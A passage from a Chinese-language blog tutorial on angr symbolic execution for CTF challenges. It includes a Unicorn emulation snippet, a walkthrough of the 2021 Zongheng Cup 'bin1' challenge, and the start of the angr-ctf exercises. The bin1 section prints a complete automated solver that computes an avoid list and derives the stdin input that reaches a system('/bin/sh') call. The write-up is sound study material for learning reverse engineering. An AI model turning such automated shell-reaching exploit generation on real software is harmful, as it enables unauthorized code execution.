class="line"><span class="built_in">print</span>(<span class="string">&quot;Emulate i386 code&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize emulator in X86-32bit mode</span></span><br><span class="line">    mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">    mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">    mu.mem_write(ADDRESS, X86_CODE32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># initialize machine registers</span></span><br><span class="line">    mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">    mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># emulate code in infinite time &amp; unlimited instructions</span></span><br><span class="line">    mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(X86_CODE32))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now print out some registers</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulation done. Below is the CPU context&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">    r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; ECX = 0x%x&quot;</span> %r_ecx)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; EDX = 0x%x&quot;</span> %r_edx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></figure>
<p>这个已经非常直接明白了</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2021纵横杯决赛-bin1"><a href="#2021纵横杯决赛-bin1" class="headerlink" title="2021纵横杯决赛-bin1"></a>2021纵横杯决赛-bin1</h3><p>程序是一坨的条件判断,存在一条正确的路径可以在最后拿到shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80485F5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_8054B1A() != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    .....</span><br><span class="line">                        .....</span><br><span class="line">                        ....</span><br><span class="line">                        ....</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_8054B1A() != <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题是无法直接使用</p>
<p>用符号执行解决这种分支问题有两个思路：</p>
<ol>
<li>找到所有从函数入口到system函数的路径，对每条路径进行操作，在每两个基本块之间进行explore</li>
<li>找到所有从函数入口到system函数的路径，将其他不在路径上的基本块地址添加到<strong>avoid_list</strong>中，再从函数入口开始explore</li>
</ol>
<p>这里计算avoid_list的原因是此题的分支数巨大，每一个分支条件语句都可能会使当前的路径再分支出一条新的路径，而且这是<strong>”指数级”</strong>增长的，也就是说符号执行所需要的时间和空间都会随分支数的增长而”指数级”增长，这显然是我们不愿看到的。<br>所以我们需要计算avoid_list，使符号执行引擎忽略某些根本不可能到达system函数的路径，这样在一定程度上避免了上述问题。</p>
<p>先看一下最终的<strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> am_graph<span class="comment">#我没有装angr-managment,但我找到了这个</span></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取system函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_addr</span>(<span class="params">cfg</span>):</span><br><span class="line">    <span class="keyword">for</span> func_addr <span class="keyword">in</span> cfg.functions:</span><br><span class="line">        func = cfg.functions.get(func_addr)</span><br><span class="line">        <span class="keyword">if</span> func.name == <span class="string">&#x27;system&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> func_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取避免执行到的地址列表</span></span><br><span class="line"><span class="comment">#关键！可以大大提高angr符号执行速度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_avoid_list</span>(<span class="params">cfg, start, target</span>):</span><br><span class="line">    <span class="keyword">if</span> start.addr == target:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">    succs = <span class="built_in">list</span>(cfg.successors(start))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(succs) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, [start.addr])</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">1</span>:</span><br><span class="line">        can_reach_target, avoid_list = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">2</span>:</span><br><span class="line">        can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[<span class="number">1</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target0 <span class="keyword">and</span> can_reach_target1:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> can_reach_target0 <span class="keyword">and</span> <span class="keyword">not</span> can_reach_target1:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#对目标函数进行符号执行，求解到达call system执行所需要的输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explore_func</span>(<span class="params">proj, target_func, target_block, target_cfg</span>):</span><br><span class="line">    can_reach_target, avoid_list = get_avoid_list(target_cfg, <span class="built_in">list</span>(target_cfg.nodes)[<span class="number">0</span>], target_block)</span><br><span class="line">    <span class="built_in">print</span>(avoid_list)</span><br><span class="line">    <span class="keyword">if</span> can_reach_target:</span><br><span class="line">    	state = proj.factory.call_state(target_func)<span class="comment">#设置初始状态</span></span><br><span class="line">    	simgr = proj.factory.simgr(state)</span><br><span class="line">    	simgr.use_technique(angr.exploration_techniques.DFS())</span><br><span class="line">    	simgr.explore(find=target_block, avoid=avoid_list)</span><br><span class="line">    	payload_list = []</span><br><span class="line">    	<span class="keyword">for</span> found <span class="keyword">in</span> simgr.found:</span><br><span class="line">        	payload_list.append(found.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    	<span class="keyword">return</span> payload_list</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#求解所有可行的payload</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explore_payload</span>(<span class="params">bin_path</span>):</span><br><span class="line">    proj = angr.Project(bin_path, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    proj_cfg = proj.analyses.CFGFast()</span><br><span class="line">    system_addr = get_system_addr(proj_cfg)</span><br><span class="line">    <span class="keyword">if</span> system_addr == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Found system function in <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>.&#x27;</span>)</span><br><span class="line">    payload_list = []</span><br><span class="line">    <span class="keyword">for</span> func_addr <span class="keyword">in</span> proj_cfg.functions:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            func = proj_cfg.functions.get(func_addr)</span><br><span class="line">            cfg = func.transition_graph</span><br><span class="line">            cfg = am_graph.to_supergraph(cfg)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes:</span><br><span class="line">                block = proj.factory.block(node.addr)</span><br><span class="line">                <span class="keyword">for</span> inst <span class="keyword">in</span> block.capstone.insns:</span><br><span class="line">                    <span class="keyword">if</span> inst.mnemonic == <span class="string">&#x27;call&#x27;</span> <span class="keyword">and</span> inst.op_str == <span class="string">&quot;&#123;:x&#125;h&quot;</span>.<span class="built_in">format</span>(system_addr):</span><br><span class="line">                        target_func = func_addr</span><br><span class="line">                        target_block = block.addr</span><br><span class="line">                        target_cfg = cfg</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Found target function in <span class="subst">&#123;<span class="built_in">hex</span>(target_func)&#125;</span>&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Found target block in <span class="subst">&#123;<span class="built_in">hex</span>(target_block)&#125;</span>&#x27;</span>)</span><br><span class="line">                        payload_list += explore_func(proj, target_func, target_block, target_cfg)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="built_in">print</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> payload_list</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_run</span>():</span><br><span class="line">    payload_list = explore_payload(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload_list)</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;payload=&#x27;</span> +  b2a_hex(payload).decode())</span><br><span class="line"> </span><br><span class="line">angr_run()</span><br></pre></td></tr></table></figure>
<p>嘿嘿,完全看不懂捏,一步一步分析一下</p>
<p>在创建完项目之后,有一句</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proj_cfg = proj.analyses.CFGFast()</span><br></pre></td></tr></table></figure>
<p>用于进行快速构建控制流图（CFG）的一个分析器。</p>
<p>因为是自动化pwn,所以选择通过分析获得system的地址</p>
<p>原作者是这样做的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_addr</span>(<span class="params">cfg</span>):</span><br><span class="line">    <span class="keyword">for</span> func_addr <span class="keyword">in</span> cfg.functions:</span><br><span class="line">        func = cfg.functions.get(func_addr)</span><br><span class="line">        <span class="keyword">if</span> func.name == <span class="string">&#x27;system&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> func_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>但实际上可以更简单的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_addr</span>(<span class="params">cfg,func_name</span>):</span><br><span class="line">	func = cfg.functions.get(func_name)</span><br><span class="line">	<span class="keyword">return</span> func.addr</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_system_addr(proj_cfg,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="number">134513728</span></span><br></pre></td></tr></table></figure>
<p>甚至</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = p.loader.find_symbol(<span class="string">&#x27;system&#x27;</span>).rebased_addr</span><br></pre></td></tr></table></figure>
<p>再然后又初始化了一个列表<code>payload_list = []</code></p>
<p>然后遍历每个函数并返回一个cfg-graph,又遍历每一个cfg-graph的nodes</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func = proj_cfg.functions.get(func_addr)</span><br><span class="line">cfg = func.transition_graph</span><br><span class="line">cfg = am_graph.to_supergraph(cfg)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>:在获得一个函数的cfg后,又将其转化为了supergraph,这一步是不可或缺的,但少了这一步也能正常执行但就是没有返回结果,因为一般cfg在call处也会停止一个基本块,所以<u>输入函数</u><code>sub_8054B1A</code>也被加入到基本块avoid_list推算,那么<code>sub_8054B1A</code>是肯定无法到达<code>system</code>的,所以非常逆天的就是<code>sub_8054B1A</code>也被加入到avoid_list了,那这样肯定是没有标准输入的…..</p>
<p>一个node通常表示程序中的一个执行点或者一个特定的结构。在控制流图（CFG）中，节点表示程序中的不同位置或者不同的结构单元.可以是以下几种类型之一：</p>
<ol>
<li><strong>基本块节点（Block Node）</strong>：表示程序中的一个连续的指令序列，通常是在程序中的一个基本块（basic block）内。基本块是一组连续执行的指令，没有条件分支，只有一个入口和一个出口。</li>
<li><strong>函数节点（Function Node）</strong>：表示程序中的一个函数，其中包含了函数的入口点和出口点，以及函数内部的基本块。</li>
<li><strong>钩子节点（Hook Node）</strong>：表示程序中的一个函数调用的目标，通常是一个库函数或者系统函数。</li>
<li><strong>其他类型的节点</strong>：根据具体的分析需求和程序结构，控制流图中可能还包含其他类型的节点，如跳转表节点、异常处理节点等</li>
</ol>
<p>取每一个node作为一个block,然后去判断block中是否存在对system的调用</p>
<p>当找到后进入一次explore_func(在本例中只有一处调用了system,也就是函数sub_80485f5,所以循环实际上会且仅会执行一次explore_func)</p>
<p>explore_func首先进行getav即找到需要避免</p>
<p>仔细看一下这个getav函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_avoid_list</span>(<span class="params">cfg, start, target</span>):</span><br><span class="line">    <span class="keyword">if</span> start.addr == target:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">    succs = <span class="built_in">list</span>(cfg.successors(start))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(succs) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, [start.addr])</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">1</span>:</span><br><span class="line">        can_reach_target, avoid_list = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">2</span>:</span><br><span class="line">        can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[<span class="number">1</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target0 <span class="keyword">and</span> can_reach_target1:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> can_reach_target0 <span class="keyword">and</span> <span class="keyword">not</span> can_reach_target1:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li>如果函数开始的第一个节点就是目标节点那么完全不需要什么avoid_list,直接返回可到达,与空avoid</li>
<li>否则获取后继节点,如果后继节点不存在,那么返回不可到达,并将start.addr作为avoid_list,即这个函数千万别进入</li>
<li>如果后继节点数量为1,递归调用getav,如果返回值是可到达那么直接返回,如果是不可到达则将该节点地址放入avoid_list并返回</li>
<li>如果后继节点为2,分别对两个后继节点递归调用getav,如果两个后继节点都能到达则直接返回可到达与空avoid,如果都不可到达则返回不可到达,并添加avoid,否则分开处理</li>
</ol>
<p>这里为啥后继节点数量不超过2,如果存在switch结构怎么办?完全不用担心,因为switch在汇编上也是jmp实现的,照样会被识别为多个block</p>
<p>这个递归函数很重要,极大节省了时间</p>
<p>视角回到explore_func,此时已经执行完了getav</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.call_state(target_func)</span><br><span class="line">   simgr = proj.factory.simgr(state)</span><br><span class="line">   simgr.use_technique(angr.exploration_techniques.DFS())</span><br><span class="line">   simgr.explore(find=target_block, avoid=avoid_list)</span><br><span class="line">   payload_list = []</span><br><span class="line">   <span class="keyword">for</span> found <span class="keyword">in</span> simgr.found:</span><br><span class="line">       payload_list.append(found.posix.dumps(<span class="number">0</span>))</span><br><span class="line">   <span class="keyword">return</span> payload_list</span><br></pre></td></tr></table></figure>
<p>首先进行了<code>proj.factory.call_state()</code>调用,<code>call_state(target_func)</code> 方法会<u>创建一个初始状态</u>，该状态模拟了执行目标函数 <code>target_func</code> 时的程序状态。这个初始状态包含了函数调用的上下文信息，如函数参数、返回地址等，并且可以被用于后续的符号执行分析。可以用于指定分析特定函数调用时的程序行为</p>
<p>然后就是常见的创建一个manager,以及指定使用DFS(深度优先算法)进行模拟探索</p>
<p>正式调用方法<code>explore(find=target_block, avoid=avoid_list)</code>,同时提供之前返回的avoid_list</p>
<p>最终获得所有发现路径中文件描述符为0的数据,即标准输入的数据,并打印出来</p>
<h3 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr-ctf"></a>angr-ctf</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/reverse/tools/simulate-execution/angr/">angr - CTF Wiki (ctf-wiki.org)</a>是一个很好的项目帮助快速入门angr的使用,刚刚应该通过这个入门的….</p>
<h4 id="explore-1"><a href="#explore-1" class="headerlink" title="explore"></a>explore</h4><p><strong>angr_find</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;JACEJGCS&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>十分简单的逆向,</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;dist/00_angr_find&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x8048678</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>angr_avoid</strong></p>
<p>这题的main函数非常庞大导致无法反编译，也无法手动分析程序流程</p>
<p>但可以看到有一个avoid函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">avoid_me</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  should_succeed = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和最终成功函数</p>
